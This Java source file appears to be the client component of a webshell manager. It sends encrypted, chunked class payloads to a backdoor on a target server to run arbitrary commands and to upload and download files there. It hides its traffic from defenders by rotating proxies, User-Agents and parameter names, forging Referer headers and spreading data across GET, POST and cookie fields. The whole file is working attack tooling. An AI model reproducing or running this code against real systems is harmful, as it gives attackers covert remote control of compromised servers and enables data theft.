package org.b1ackc4t.sender;

import com.alibaba.fastjson.JSONObject;

import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.*;

import org.b1ackc4t.util.Config;
import org.b1ackc4t.util.DBManager;
import org.b1ackc4t.util.Utils;

public class Sender {
    private final String password;
    private final String url;
    private final String type;
    private final String key;
    private final String method;
    private final Map<String, String> headers;
    private final List<String> paramNames = Config.paramNames;
    private final List<String> cookieNames = Config.cookieNames;
    private static final List<String> useragents = Utils.readFileByLines("useragents.txt");
    private static List<String> ipAgents;
    private final int partNum = Config.partNum;
    private final int argNum = Config.argNum;
    private static DBManager db = DBManager.db;
    public String reqEncode = "base64";
    public String resEncode = "base64";

    static {
        if (Config.startIpAgents) {
            ipAgents = Utils.readFileByLines("ipagents.txt");
        }
    }

    public Sender(String url, String password, String type, String method) {
        this.url = url;
        this.password = password;
        this.type = type;
        this.key = Sender.getKey(this.password);
        this.method = method;
        this.headers = new TreeMap<>();
    }

    public Sender(String url, String password, String type, String method, Map<String, String> headers) {
        this(url, password, type, method);
        resetUseragent();
        this.headers.put("Referer", getReferer());
        this.headers.putAll(headers);
    }

    private String urlEncode(byte[] data) throws UnsupportedEncodingException {
        return URLEncoder.encode(new String(data), "UTF-8");
    }

    private String[] getProxyInfo() {
        if (Config.startIpAgents) {
            String proxyStr = Utils.getRandomItem(ipAgents);
            if (proxyStr == null) return new String[]{null, null};
            String[] r = proxyStr.split(";", 2);
            if (r.length == 1 || r[1].equals("")) {
                return new String[]{r[0], null};
            } else {
                return r;
            }
        }
        return new String[]{null, null};
    }

    private int getEncodeFlag() {
        switch (resEncode) {
            case "raw":
                return 0;
            case "hex":
                return 1;
            case "base36":
                return 2;
            default:
                return 3;
        }
    }

    /**
     * 向服务端发送请求
     * @param data
     * @return
     */
    private Map<String, Object> sendRequest(byte[] data) {
        if (Config.startRandomUserAgent) resetUseragent();
        String[] proxy = getProxyInfo();
        try {
            if (method.equalsIgnoreCase("get")) {
                Map<String, String> params = new LinkedHashMap<>();
                byte[][] data_parts = Utils.splitBytes(data, argNum);
                Collections.shuffle(paramNames);
                for (int i = 0; i < argNum; ++i) {
                    params.put(paramNames.get(i), urlEncode(data_parts[i]));
                }
                return Utils.sendGetRequest(url, headers, params, proxy[0], proxy[1]);
            } else if (method.equalsIgnoreCase("post")) {
                Map<String, String> params = new LinkedHashMap<>();
                byte[][] data_parts = Utils.splitBytes(data, argNum);
                Collections.shuffle(paramNames);
                for (int i = 0; i < argNum; ++i) {
                    params.put(paramNames.get(i), urlEncode(data_parts[i]));
                }
                return Utils.sendPostRequest(url, headers, params);
            } else if (method.equalsIgnoreCase("mixed")) {
                Map<String, String> getParams = new LinkedHashMap<>();
                Map<String, String> params = new LinkedHashMap<>();
                byte[][] data_parts = Utils.splitBytes(data, argNum);
                int f = new Random().nextInt(data_parts.length);
                Collections.shuffle(paramNames);
                for (int i = 0; i < f; ++i) {
                    getParams.put(paramNames.get(i), urlEncode(data_parts[i]));
                }
                String tmpUrl = String.format("%s?%s", url, Utils.getUrlParamsByMap(getParams));
                for (int i = f; i < argNum; ++i) {
                    params.put(paramNames.get(i), urlEncode(data_parts[i]));
                }
                return Utils.sendPostRequest(tmpUrl, headers, params);

            } else if (method.equalsIgnoreCase("cookie")) {
                Map<String, String> params = new LinkedHashMap<>();
                byte[][] data_parts = Utils.splitBytes(data, argNum);
                Collections.shuffle(cookieNames);
                for (int i = 0; i < argNum; ++i) {
                    params.put(cookieNames.get(i), urlEncode(data_parts[i]));
                }
                Map<String, String> tmpHeaders = new LinkedHashMap<>(headers);
                String cookieStr = Utils.getCookieByMap(params);
                if (null != headers.get("Cookie")) {
                    tmpHeaders.put("Cookie", headers.get("Cookie") + ";" + cookieStr);
                } else {
                    tmpHeaders.put("Cookie", cookieStr);
                }
                return Utils.sendGetRequest(url, tmpHeaders, null, proxy[0], proxy[1]);
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 刷新user-agent
     */
    private void resetUseragent() {
        String r = Utils.getRandomItem(useragents);
        if (r != null) headers.put("User-Agent", r);
    }

    /**
     * 获取上一级目录URL作为referer
     * @return 请求的referer
     */
    public String getReferer() {
        URL u;
        try {
            u = new URL(this.url);
            String oldPath = u.getPath();
            if (oldPath.equals("")) {
                return this.url;
            } else {
                int lastSlash = oldPath.lastIndexOf('/');
                String newPath = oldPath.substring(0, lastSlash);
                URL newU = new URL(u.getProtocol(), u.getHost(), u.getPort(), newPath);
                return newU.toString();
            }
        } catch (Exception e) {
            return this.url;
        }
    }


    /**
     * @description 生成加密算法的密钥
     * @param password
     * @return java.lang.String
     */
    public static String getKey(String password) {
        if (password != null && password.length() != 0) {
            MessageDigest md5 = null;
            StringBuilder md5_code = null;
            try {
                md5 = MessageDigest.getInstance("MD5");
                md5.update(password.getBytes());
                byte[] ba = md5.digest();
                md5_code = new StringBuilder(new BigInteger(1, ba).toString(16));
                for (int i = 0; i < 32 - md5_code.length(); ++i) {
                    md5_code.insert(0, "0");
                }
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
            assert md5_code != null;
            return md5_code.substring(0, 16);
        } else {
            return null;
        }
    }

    private byte[] resDecodeFun(byte[] data) {
        switch (resEncode) {
            case "raw":
                return data;
            case "hex":
                return new BigInteger(new String(data), 16).toByteArray();
            case "base36":
                return new BigInteger(new String(data), 36).toByteArray();
            default:
                return Crypt.b64Decoder.decode(data);
        }
    }

    private JSONObject attack(String className, Map<String, Object> params, String command) {
        Map<String, Object> result = null;
        boolean firstFlag = false;
        PayloadGenerator pg = new PayloadGenerator(type, key, reqEncode, resEncode);
        try {
            if (db.getClassLoadStatus(url, className) == 1) {
                String clsName = db.getClassLoadName(url, className);
                byte[] payload = String.format("%s@%s", clsName, command).getBytes();
                result = sendRequest(pg.handlePayloadData(payload));
            } else {
                firstFlag = true;
                byte[] payload = pg.getClassData(className, params);
                byte[][] payloads = Utils.splitBytes(payload, partNum);
                for (byte[] part : payloads) {      // 进行分块发包
                    result = sendRequest(pg.handlePayloadData(part));
                    if (result.get("status").equals(200)) {   // 把cookie设置一下
                        Map<String, String> response_header = (Map<String, String>) result.get("headers");
                        String c = Utils.getCookieBySetCookie(response_header);
                        if (null != c) {
                            headers.put("Cookie", c);
                        }
                    }
                }
            }
            JSONObject resultJson = new JSONObject(); // 最后返回的结果
            assert result != null;
            if (result.get("status").equals(200)) {
                byte[] resData = (byte[])(result.get("data"));  // 拿到响应体内容
                byte[] mData = Crypt.decrypt(resDecodeFun(resData), key, type);  // 解码解密获取明文
                if (mData[0] == 49 && mData[1] == 64) {
                    byte[] rightData = new byte[mData.length - 2];
                    System.arraycopy(mData, 2, rightData, 0, rightData.length);
                    resultJson.put("status", "c3VjY2Vzcw==");
                    resultJson.put("msg", new String(Crypt.b64Encoder.encode(rightData)));
                } else {
                    resultJson.put("status", "ZmFpbA==");
                    resultJson.put("msg", new String(Crypt.b64Encoder.encode(resData)));
                    return resultJson;
                }
                if (firstFlag) {
                    db.setClassLoadStatus(url, className, pg.newClassName.replace('/', '.'));
                }
            } else {
                resultJson.put("status", "ZmFpbA==");
                resultJson.put("msg", new String(Crypt.b64Encoder.encode(String.valueOf(result.get("status")).getBytes())));
            }
            return resultJson;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * @description 测试连接是否成功
     * @return boolean
     */
    public boolean testCon() {

        String content;
        JSONObject result;
        int randStringLength;
        randStringLength = (new SecureRandom()).nextInt(15) + 5;
        content = Utils.getRandomString(randStringLength);

        if (type.equals("java")) {
            result = print(content);
            if (result.getString("status").equals("c3VjY2Vzcw==")) {
                return new String(Crypt.b64Decoder.decode(result.getString("msg"))).equals(content);
            } else {
                System.out.printf("fail! message: %s%n", new String(Crypt.b64Decoder.decode(result.getString("msg"))));
                return false;
            }
        }
        return false;

    }

    /**
     * @description 打印
     * @param content   要打印的字符串
     * @return org.json.JSONObject
     */
    public JSONObject print(String content) {
        Map<String, Object> params = new HashMap<>();
        params.put("content", content);
        params.put("key", key);
        params.put("encode", getEncodeFlag());
        return attack("Print", params, content);
    }

    /**
     * @description 任意命令执行
     * @param cmd  执行的命令
     * @return org.json.JSONObject
     */
    public JSONObject rce(String cmd) {
        Map<String, Object> params = new HashMap<>();
        params.put("cmd", cmd);
        params.put("key", key);
        params.put("encode", getEncodeFlag());
        return attack("Rce", params, cmd);
    }

    /**
     * @description 上传文件到服务端
     * @param remote_path 远程上传位置
     * @param local_path 要上传的本地文件位置
     * @return org.json.JSONObject
     */
    public JSONObject upload(String local_path, String remote_path) {
        Map<String, Object> params = new HashMap<>();
        byte[] file_content = Utils.getFileContent(local_path);
        String content = new String(Crypt.b64Encoder.encode(file_content));
        params.put("path", remote_path);
        params.put("content", content);
        params.put("key", key);
        params.put("encode", getEncodeFlag());
        return attack("Upload", params, String.format("%s;%s", remote_path, content));

    }

    public JSONObject download(String remote_path) {
        Map<String, Object> params = new HashMap<>();
        params.put("path", remote_path);
        params.put("key", key);
        params.put("encode", getEncodeFlag());
        return attack("Download", params, remote_path);
    }

}
